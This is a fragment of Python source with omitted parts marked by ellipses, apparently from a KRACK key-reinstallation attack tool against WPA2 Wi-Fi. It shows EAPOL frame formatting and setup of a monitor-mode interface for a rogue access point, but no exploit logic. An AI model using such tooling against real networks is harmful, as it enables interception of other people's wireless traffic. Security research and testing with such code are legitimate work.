...
def dot11_to_str(p):
	...
	if p.type == 0:
		...
		if EAPOL in p:
			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)".encode() % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
...
class KRAckAttack():
	...
	def configure_interfaces(self):
		...
		subprocess.check_output(["iw", self.nic_real, "mode", "managed"])
		if self.nic_rogue_mon is None:
			...
			subprocess.check_output(["iw", self.nic_rogue_mon, "mode", "monitor"])
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
